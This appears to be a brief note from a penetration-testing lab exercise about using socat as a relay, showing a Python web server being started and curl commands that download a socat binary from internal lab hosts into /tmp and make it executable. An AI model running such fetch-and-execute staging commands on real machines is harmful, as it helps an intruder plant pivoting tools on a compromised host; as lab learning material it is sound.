Socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations.

I have download the socat file for Linux and fire up a web server here.
```
python3 -m http.server 8080
```

```
curl 10.200.105.200/socat -o /tmp/socat && chmod +x /tmp/socat
```

```
curl 10.50.106.240/socat-Sardarji -o socat-sardarji
```
